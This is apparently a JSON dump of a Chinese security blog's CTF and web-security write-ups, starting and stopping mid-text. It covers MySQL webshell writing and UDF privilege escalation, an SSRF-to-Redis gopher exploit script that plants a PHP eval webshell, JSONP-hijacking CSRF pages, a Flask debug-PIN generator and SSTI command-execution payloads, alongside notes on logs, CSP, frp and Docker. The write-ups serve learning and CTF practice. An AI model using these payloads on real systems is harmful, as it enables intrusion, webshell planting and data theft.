&gt;= 5.7 )select @@version_compile_os,@@version_compile_machine; 查询当前操作系统 写shell的几种方式Union selectunion select ‘‘ into outfile /var/www/html/shell.php# lines terminated byselect * from phpcmsv9.v9_admin_role where roleid = 1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines terminated by ‘‘;原理：通过select语句查询的内容写入文件，也就是 1 into outfile ‘C:/wamp64/www/work/webshell.php’ 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。 lines starting by类似lines terminated by fields terminated by利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。 columns terminated by如上同理 sqlmap写webshell类似上述Mysql写webshell，不过更自动化了，使用命令为 mysql -u url –os-shell，要求同上–目录可写，关闭gpc，绝对路径，ban secure_file_priv mysql UDF提权参考链接：https://blog.csdn.net/qq_26406447/article/details/102691188https://www.jianshu.com/p/5b34c1b6dee7什么是UDF？UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。通过动态库方式实现首先通过注入获取mysql账号密码 1234&#x2F;&#x2F;MySQL 5.6 and belowselect host, user, password from mysql.user;&#x2F;&#x2F;MySQL 5.7 and aboveselect host, user, authentication_string from mysql.user; 有列数限制的话就group_concat(c1,c2,c3 separator ‘-‘)拿到密码后去搜一下md5值。。这里默认root root然后远程连接mysql看一下secure_file_priv接下来就把对应mysql版本的dll文件传上去 位数查看命令：show variables like ‘%version_%’；，位数不对使用dll文件的时候会报错！！！一定注意我这里是64位，就传64位的了，传之前需要用sqlmap的dll，但是异或编码，需要解码，解码也在sqlmap里面。python cloak.py -d -i …/64/lib_mysqludf_sys.dll_解码后上传到数据库对应的位置里面去这里我上传出了点问题，太离谱了。我不太会用loadfile，所以把文件通过010editor，转为16进制导出，然后在notepad去掉空格和换行符(匹配’\\r\\n’),然后select unhex(‘data’) into dumpfile ‘path/plugin/udf.dll’接下来，create function sys_eval returns string soname “udf.dll”;之后就可以愉快地在mysql里面使用系统权限执行命令了。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"apache、nginx、iis日志浅析","slug":"日志浅析","date":"2020-06-17T14:18:25.000Z","updated":"2020-06-17T15:49:23.527Z","comments":true,"path":"2020/06/17/日志浅析/","link":"","permalink":"https://polosec.github.io/2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/","excerpt":"","text":"小知识：常见的Linux发行版本：Redhat、Ubuntu、CentOS、SuSE、Gentoo、Debian、Fedora、最近hw面试问到的问题，特地整理一下。 Find命令面试里面问我怎么用find命令找nginx的日志文件（先问的我nginx的日志文件叫啥。。我不知道。。尴尬）然后提示我是.log结尾，然后我就说了find / -name “.log” 没想到害蒙对了… 准确的表述应该是 find /var/log/nginx -name “.log”这里说一下find命令的一些用法。-exec/-ok都是执行命令，不过-ok会先给出提示，让用户确定是否执行。find . -perm 777 -exec ls -l {} ;-perm 是按照权限进行查找比如 find / -perm 777 Linux权限顺便说一下Linux权限问题RWX read-write-execute对应权值为4-2-1所以chmod 777的意思就是说给所有的用户可读可写可执行的权限（危险每个7分别对应User、Group、Other的权限。 Apche、Nginx、IIS日志Apache:centos配置文件：/etc/httpd/conf/httpd.confUbuntu配置文件：/etc/apache2/apache2.conf日志文件的配置在httpd.conf中。apache日志记录了客户端ip、时间、方法、请求资源、status code、content length等信息。Windows平台的日志位置默认在apache/logs/access.log error.log在基于Debian的Linux上(Ubuntu)，系统范围的Apache错误日志默认位置是/var/log/apache2/error.log在基于 Red Hat 的Linux中(centos)，系统范围的 Apache 错误日志文件默认被放置在/var/log/httpd/error_logNginx:Windows：logs/access.logLinux:/var/log/nginx/access.log默认配置文件：/etc/nginx/nginx.confIIS:IIS6 默认情况下 IIS日志文件目录 为 C:\\windows\\system32\\LogFilesIIS7.5 默认情况下IIS日志目录为 “%SystemDrive%\\inetpub\\logs\\LogFiles” 其中%SystemDrive% 表示系统安装位置，一般指 C: 盘，点击“浏览”按钮可自定义存放IIS日志目录。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"浅谈SSRF与redis及其相关问题","slug":"浅谈SSRF与redis及其相关问题","date":"2020-06-13T09:18:38.000Z","updated":"2020-06-13T10:26:14.636Z","comments":true,"path":"2020/06/13/浅谈SSRF与redis及其相关问题/","link":"","permalink":"https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/","excerpt":"","text":"什么是Redis Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。 Redis漏洞Redis会因为配置不当而产生漏洞。Redis默认监听端口为 0.0.0.0:6379,默认没有设置密码认证，这意味着redis服务器暴漏在公网并且可以被操作。Redis未授权漏洞利用情况有如下几种1.敏感数据泄露2.写shell3.把公钥写入authorized_keys，可以登录主机。（需要Redis以root权限运行）4.contrab反弹shell Redis漏洞利用对于未授权访问的情况，可以获取到Redis服务器ip后在本地远程连接Redis服务器，也可以构造数据包向Redis服务器发送恶意代码。 SSRF与各种协议SSRF全程为 Server-Side-Request-Forgery 服务器端请求伪造，即为通过服务器对内网资源进行一些请求，可以进行文件读取，内网扫描、主机探测、漏洞利用等活动。 Gopher协议Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议gopher协议格式：URL: gopher://:/_UrlEncodedTCPStream file协议curl支持file协议，可以通过file协议LFI。file:///etc/passwd dict协议curl支持dict协议，可以通过dict协议探测服务信息。curl dict://127.0.0.1:22 例题GKCTF-2020 EasyWeb这道题拿到手没啥思路 看到源码提示了secret之后发现是ifconfig然后就使用burp扫一下内网，发现一台173.187.36.11这台服务器的报错是redis的报错。然后爆破扫一下端口，发现是默认的6379。接下来考虑SSRF打内网未授权Redis。EXP: 12345678910111213141516171819202122232425262728293031import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.216.189.11&quot;port=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 替换url和payload即可生成payload为 1gopher:&#x2F;&#x2F;173.187.36.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 然后访问http://redis_ip/shell.php即可getflag 参考链接https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNodehttps://zhuanlan.zhihu.com/p/112055947https://www.freebuf.com/column/158065.htmlhttps://www.freebuf.com/vuls/162035.htmlhttps://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"恶臭数据包","slug":"恶臭数据包","date":"2020-06-06T14:39:48.000Z","updated":"2020-06-06T15:04:29.218Z","comments":true,"path":"2020/06/06/恶臭数据包/","link":"","permalink":"https://polosec.github.io/2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/","excerpt":"","text":"数据包分析下载完数据包之后，protocol全都是802.11，考虑数据包被加密了，接下来进行解密。使用aircrack-ng 对数据包进行解密，使用的字典为fuzzdict wifipwdtop2000。 跑出来wifi密码为12345678，结合SSID对数据包进行解密。 数据包解密首选项-协议-IEEE802.11-编辑decryption keys。type选择wpa-pwd,格式为 wifi密码:SSID也可以从https://www.wireshark.org/tools/wpa-psk.html 根据wifi密码和SSID生成PSK，type选择PSK就好。点击确认后就可以在数据包页面看到解密的分组了。首先过滤http和tcp分组，语法为：http and tcp过滤后发现有上传图片的分组，遂过滤之，取其数据并导出。导出方法：选择分组，在分组详情那选中media type 就可以自动选择媒体数据。 然后右键导出分组字节流就可以导出图片了。 图片分析习惯性地丢到binwalk分析，分离出来一个压缩包，有密码，不是伪加密，考虑从数据包找答案。其实做到这里有点没思路了，看了看解析发现接下来做下去要看session。session是JWT格式，还原地址：https://www.jstoolset.com/jwt还原后：提示压缩包密码是刚才ping过的一个网站，于是搜索icmp协议，但是没有。 柳暗花明去ping域名的话会先进行dns解析，于是过滤dns协议，在最后一个dns协议包里面找到ping的域名，作为压缩包密码填进去，得到flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"流量分析","slug":"流量分析","permalink":"https://polosec.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"CSP-XSS Bypass","slug":"CSP-XSS-Bypass","date":"2020-06-02T07:25:59.000Z","updated":"2020-06-02T16:09:24.912Z","comments":true,"path":"2020/06/02/CSP-XSS-Bypass/","link":"","permalink":"https://polosec.github.io/2020/06/02/CSP-XSS-Bypass/","excerpt":"","text":"参考链接：https://www.zhihu.com/question/21979782https://xz.aliyun.com/t/5084#toc-2https://www.cnblogs.com/thenbz3/p/11863641.html CSP的概念CSP 是 Content Security Policy 的缩写，即内容安全策略。CSP旨在减少XSS攻击，具体原理是通过设置response header或者在页面中使用meta标签规定受信任的、可执行的JS、图片、iframe、style来源。任何不符合CSP规则的资源都将无法被加载。 CSP示例12Content-Security-Policy: script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https: 资源限制类型（引用）：script-src：外部脚本 指定了允许从哪里加载JS脚本style-src：样式表img-src：图像media-src：媒体文件（音频和视频）font-src：字体文件object-src：插件（比如 Flash）child-src：框架frame-ancestors：嵌入的外部资源connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）worker-src：worker脚本manifest-src：manifest 文件default-src ‘self’ 该属性值为self时只允许本站资源加载。设置了这个就为上述属性设置了默认值‘self’上述属性如果不明确指定的话则默认范围是*，即允许所有。script-src属性里面 设置unsafe-inline 允许内嵌的脚本及样式 不写这个默认不允许。script-src属性里面 设置unsafe-eval 允许通过字符串动态创建的脚本执行，比如 eval，setTimeout 等。不写这个默认不允许。script-src ‘nonce-EDNnf03nceIOfn39fn3e9h3sdfa’ 这句话的意思是说只允许nonce值为EDNnf03nceIOfn39fn3e9h3sdfa的脚本执行。(xxx) 同理也可以设置hash值。 CSP绕过CSP绕过我只使用过一种方法，就是Location.href，其他的方法暂时没有尝试过，在 https://xz.aliyun.com/t/5084#toc-2 这篇文章里面写的挺多的，可以仔细阅读。另外一种我感觉有意思的绕过就是CRLF注入绕过，在CSP之前找到CRLF注入点来两个CRLF把CSP挤到body里面。。高，实在是高 CSP BYPASS实例这道题是CSICN_华东北赛区_WEB2 在buuoj有复现。其他的点我看网上都说的差不多了 唯独CSP Bypass说的不详细，这里我详细说一下CSP绕过，其他的不仔细说，就简要说一下如何成功拿到flag。有个投稿和反馈，说了管理员会查看，猜测XSS拿cookie。提交申请时需要爆破md5，好说，写脚本即可。先尝试随便投稿投稿后查看页面，发现存在CSP，所以需要绕过csp。接下来进行XSS，由于过滤了很多关键字，所以考虑HTML实体编码—把字母转ascii并在前面加上&amp;#后面加上;标签可以嵌入JS代码。直接用XSS平台的payload的话会这样： 接下来使用location.href绕过。爆破完md5后管理员点击完在XSS平台就收到cookie啦。接下来是联合注入，最后一句话是-1 union select 1,2,flagg from ciscn.flag，得到flag 总结这道题时隔一年才弄明白CSP是怎么回事，属实我的问题，继续学习，继续努力。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"frp内网穿透","slug":"frp内网穿透","date":"2020-06-01T00:28:46.000Z","updated":"2020-06-01T00:58:45.902Z","comments":true,"path":"2020/06/01/frp内网穿透/","link":"","permalink":"https://polosec.github.io/2020/06/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","excerpt":"","text":"参考链接https://blog.csdn.net/fjh1997/article/details/100850756https://zhuanlan.zhihu.com/p/45445979最近在搭建学校的网络安全训练平台，使用的是CTFD+CTF-Whale组件生成动态独立靶机，由此引发了对内网穿透的思考。首先理解什么是内网穿透 内网穿透的概念了解内网穿透前，需要了解内网穿透这个需求出现的原因。ipv4地址稀缺，于是出现了NAT,NAPT技术实现IP”复用”。NAT：将私网地址通过NAT网关转换成公网地址，同时通信的数量受NAT网关公网地址数限制。NAPT:将私网地址和端口号通过NAPT网关转换成公网地址：端口号，NAPT网关维护一张映射表，记录公网ip:port和私网ip:port的对应关系。这样可以大幅度降低对公网IP的需求量。为什么需要内网穿透？我家电脑是移动的，没有给分配独立的公网IP，我在本机搭建的http服务无法被公网看到。为了解决这类问题，内网穿透技术应需求而生。比如访问我家电脑8888端口的web服务，直接访问我ipip.net看到的ip地址:8888是无法访问的，因为NAT网关没有8888出站记录 的映射关系。内网穿透概念（复制）：内网穿透是我们在进行网络连接时的一种术语，也叫做NAT穿透，即在计算机是局域网内的时候，外网与内网的计算机的节点进行连接时所需要的连接通信，有时候就会出现内网穿透不支的情况。内网穿透的功能就是，当我们在端口映射时设置时，内网穿透起到了地址转换的功能，也就是把公网的地址进行翻译，转成为一种私有的地址，然后再采用路由的方式ADSL的宽带路由器，具有一个动态或者是固定的公网IP，最后ADSL直接在交换机上，这样所有的电脑都可以共享上网。内网穿透除了可以实现内网之间机器的网络通信功通之外，还可以解决UDP中出现的数据传输不稳定问题。看了两张图感觉写的比较好 内网穿透的思路内网电脑主动发消息给公网服务器，相当于公网服务器在转发内网服务器的数据，使用第三台机器访问公网服务器的时候即可访问内网服务器提供的服务。这受公网服务器带宽限制。 内网穿透实现（frp）网络结构： 服务器为Windows10，移动大内网xD,服务器是我科学上网用的vps，有独立的公网IP。软件安装：首先在github上下载对应系统架构的frp，Windows比较好选，我出问题的是vps的版本选择，一开始选的是amd64版本，但是无法执行bin file,使用arch命令查看架构后才发现架构为i686，是32位系统。。。哎。软件配置： 软件配置参考https://zhuanlan.zhihu.com/p/45445979 这里不想在详细展开说，注意几点，就是不能人家写什么你就写什么，需要明白各个配置的意义，否则你搁这穿什么呢？vhost_http_port 参数配置的是web服务的端口，需要在frpc客户端定义domain（没有的话就写服务器ip），指明本地web服务端口。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"Docker技术原理浅析","slug":"Docker技术原理浅析","date":"2020-05-29T14:41:05.000Z","updated":"2020-05-29T15:25:06.366Z","comments":true,"path":"2020/05/29/Docker技术原理浅析/","link":"","permalink":"https://polosec.github.io/2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/","excerpt":"","text":"参考链接：https://www.zhihu.com/question/331023021https://www.zhihu.com/question/48174633/answer/616413576别人说的话我就不复制粘贴了，挑一些我个人认为比较有意思的点和比较基础的点说一下。 docker的一些概念image image是一堆只读层的统一视角，UFS技术可以把这一对只读层整合成一个文件系统 container 容器就是在image上面加了一个可读可写层。container=image+ R&amp;W Layerdocker start=docker create &amp; docker run Repository Repository意思为仓库，类似github上面有很多代码可以clone到本地，在docker中就相当于可以pull镜像到本地。官方的仓库是docker hub Registry Registry是私有仓库，Registry包含了一个或多个Repository，每个Repository可以有多个Tag，每个Tag对应一个image。我理解的docker是”轻量级”虚拟机。这个概念应该不是正确的，因为虚拟机和docker的区别还是挺大的，再多抽象几层我感觉这么理解也可以docker的方便之处在于不需要像虚拟机一样重新虚拟出来硬件和操作系统，docker只需要pull镜像直接用就行。docker可以快速部署的另一个原因除了是分层可复用之外，就是可以”一键”安装所需依赖。我理解的是类似makefile。dockerfile类似makefile，但是一个dockerfile对应一个容器或者说对应着一个服务（如MySQL）然后docker-compose.yml 包含一个个dockerfile文件形成了一个工程。docker 进程会对每个容器的资源进行管理。docker的镜像分层我认为是比较有意思的，有点类似面向对象编程思想的”继承”。docker的基础镜像应该是最大的，但是从基础镜像新建一个镜像的话，并不需要复制所有内容，即不需要占用两倍的存储空间，只需要把不一样的保存下来就好。这得益于Linux的COW策略。即：没写过文件的不用动，写过的文件保存成新的文件。docker会在容器最上层创建一个读写层，用来保存对基础镜像的修改操作操作的文件。 docker与虚拟机的区别首先是虚拟化层次不一样。虚拟机完整地虚拟了内核和用户空间，而docker仅仅是虚拟了用户空间，内核用的是操作系统的内核。每个容器只是说相互之间的应用、依赖不同，但其最底层的镜像应该是相同的。他们用共同一个基础镜像，对基础镜像有修改，这个修改保存到各个容器内部，docker进程对容器之间进行隔离。docker启动速度快，占用资源少；而虚拟机启动速度慢，消耗资源多。这里引用两句话，感觉说的非常好：“其实最大的区别在于应用场景的不同：虚拟机最开始出现是为了模拟不同的硬件平台，但是现在云计算时代是为了提供的计算能力的虚拟化，这样可以快速灵活的划分和分配计算资源。容器则是随着应用程序的架构发展所自然衍生出来的东西。当软件越来越复杂，单体应用没法再发展下去了，每个功能逐渐独立出来，出现面向服务的架构，进而出现所谓微服务的架构。“","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"JSON&JSONP&CSRF","slug":"JSON-JSONP-CSRF","date":"2020-05-22T02:12:47.000Z","updated":"2020-06-01T02:56:38.421Z","comments":true,"path":"2020/05/22/JSON-JSONP-CSRF/","link":"","permalink":"https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/","excerpt":"","text":"参考链接：https://cloud.tencent.com/developer/article/1516219https://blog.csdn.net/u011089760/article/details/93550458https://blog.csdn.net/qq_37133717/article/details/105749589https://blog.csdn.net/tianjindong0804/article/details/84971922https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html JSON谈jsonp之前，首先明白什么是json。json全称JavaScript Object Notation，JS对象标记，是一种轻量级的数据交换方式，JSON最常用的是对象的键值对，有点像python中dict数据结构。例如{“k1”:”v1”,”k2”:”v2”} JSON HijackingJSON劫持通过诱导用户点击恶意文件，重写Array()构造函数的方法，将json数据发送给攻击者。JSON劫持步骤（参考）1）重新定义数组构造函数Array = function() 并将数组赋值给我们定义的全局变量； 2）向目标网站发送一条请求，借用被攻击者的session权限； 3）将获得的数据赋给yourData，从而进行任意处理。 其中第一步的函数覆盖是关键，可以JS中的方法覆盖的特性或者使用JS的特殊方法Object.prototype.__defineSetter__等。（这个函数在新版chrome和firefox已失效。） JSONP什么是JSONP？JSONP是带有填充（Padding）的JSON数据。JSONP为了解决跨域问题，我们知道，JS,XHR(AJAX)可以发起跨域请求，但是拿不到跨域请求的资源（或者说看不到响应、拿不到响应数据） JSONP最大的特征是回传。使用方法为在页面中加入&lt;script&gt;标签,src属性为请求的JS资源的URL，最后加上回调函数的名称，比如请求URL为：www.test.io/1.php?callback=cb然后在当前页面需要写一个JS函数： 1234function cb(data)&#123; alert(data.username)&#125; 举个例子：前端页面： 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;title&gt;hack&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function resolveJson(result) &#123; //浏览器端代码 alert(result.name); &#125; &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://test2.io/jsonp.php?callback=resolveJson&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 后端处理： 12345&lt;?php$callback = $_GET[&#x27;callback&#x27;];$arr = array(&quot;name&quot; =&gt; &quot;alsy&quot;, &quot;age&quot; =&gt; &quot;20&quot;);echo $callback.&quot;(&quot;. json_encode($arr) .&quot;);&quot;;?&gt; 效果： JSONP注入由于传的callback内容是自定义的，所以可能会导致XSS（返回包content-type为text/html的话）如传入的?callback=callback=alert(‘xss’) JSONP劫持JSONP劫持的目的是盗取用户敏感数据，或者拿到token进行CSRF利用JSON劫持与JSONP注入的异同：同:都可以劫持用户数据，盗取敏感信息，挂马等操作异：jsonp返回的数据有callback函数名包裹。jsonp注入还可以造成xss。 JSONP劫持流程1.用户登录存在JSONP劫持的网站，通常参数存在callback 或者htmlback2.用户携带身份信息访问攻击者编写的页面。3.攻击者编写的页面自定义了callback函数名，并且通过script标签像用户隐私数据发起请求（这里需要用到用户身份信息）4.用户访问攻击页面后，携带身份信息访问攻击者指定的JSONP数据，并且在当前攻击页面的回调函数中完成操作（该操作可能是发送隐私信息给攻击者，也可能是拿token进行csrf） #JSONP与CSRF思路：通过JSONP得到页面的token，然后生成表单，写上token，发送请求。攻击页面代码： 1234567891011121314151617181920212223242526272829303132&lt;html&gt;&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;test&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;function test(obj)&#123; // 获取对象中的属性值 var content = obj[&#x27;html&#x27;] // 正则匹配出参数值 var token=content.match(&#x27;token = &quot;(.*?)&quot;&#x27;)[1]; // 添加表单节点 var parent=document.getElementById(&quot;test&quot;); var child=document.createElement(&quot;form&quot;); child.method=&quot;POST&quot;; child.action=&quot;http://vuln.com/del.html&quot;; child.id=&quot;test1&quot; parent.appendChild(child); var parent_1=document.getElementById(&quot;test1&quot;); var child_1=document.createElement(&quot;input&quot;); child_1.type=&quot;hidden&quot;;child_1.name=&quot;token&quot;;child_1.value=token; var child_2=document.createElement(&quot;input&quot;); child_2.type=&quot;submit&quot;; parent_1.appendChild(child_1); parent_1.appendChild(child_2);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://vuln.com/caozuo.html?htmlcallback=test&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 实现JSONP+CSRF有些难度，首先需要存在jsonp劫持，其次能在源码里找到token，最后需要绕过referer限制。 referer绕过策略：1.空referrer:在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。恰恰也就是这个忽视，导致了整个防御的奔溃。因为在通过跨协议调用 js 时，发送的 http 请求里 Referer 为空！ 跨协议调用的一个简单例子： 1&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;www.qq.com&#x2F;login.php?calback&#x3D;JSON&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;&lt;&#x2F;iframe&gt; 代码里我们使用 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件。（参考自知道创宇https://blog.knownsec.com/2015/03/jsonp_security_technic/） 2.绕过referrer的正则有些referer的正则写的不太行，可以绕过。。不过估计现代网站应该比较完善了 防护严格定义 Content-Type: application / json这样可以防止XSS 完善referer过滤规则过滤JSON的数据输出","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"再谈flask-ssti","slug":"再谈flask-ssti","date":"2020-05-18T07:04:23.000Z","updated":"2020-05-18T08:30:54.474Z","comments":true,"path":"2020/05/18/再谈flask-ssti/","link":"","permalink":"https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/","excerpt":"","text":"进一步理解flask-sstissti的目的：1.读取文件（LFI,获取secret key 伪造session）2.RCE BUUOJ FLASK-APP 题目分析先看看提示，提示了PIN 第一种做法：参考链接https://xz.aliyun.com/t/2553简单地说就是flask app 在debug模式下通过terminal显示的pin码可以在报错的时候进入python shell。并且运行应用程序时该pin码不会变。接下来需要知道生成PIN码需要什么。1.当前用户名2.app.py的绝对路径3.model name 一般是flask.app4.app名称 一般是Flask5.网卡十进制数（服务器的，读/sys/class/net/eth0/address）6.machine-id（docker的话需要读取/proc/self/cgroup ，正常Linux读取/etc/machine-id）那么接下来就需要获取这些。首先是app.py的绝对路径，通过报错获得： /usr/local/lib/python3.7/site-packages/flask/app.py然后是当前用户名，有两种方法，我用的是第一种，通过ssti 读文件/etc/passwd 发现用户flaskweb，猜测就是这个用户另一种准确的方法是执行系统命令： 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125; 这里需要绕过os popen过滤 方法是拼接字符串 用单引号。双引号会失败 不知道为什么看到当前用户是flaskweb。接下来读取网卡十进制与machine-id 由于buuoj是docker环境，所以需要从/proc/self/cgroup读。网卡： 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;).read()&#125;&#125; 02:42:ae:01:5e:21 转十进制不用说了。2485410422305machine-id： 123&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;).read()&#125;&#125;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf 生成PIN码的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485410422305&#x27;,# str(uuid.getnode()), /sys/class/net/ens33/address &#x27;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 生成出来的PIN 在报错页面点击右面的terminal图标输入进去就好啦，接下来就是愉快的命令执行了~ finished. 第二种做法既然知道了是SSTI,WHY NOT RCE DIRECTLY!! 12&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;ls 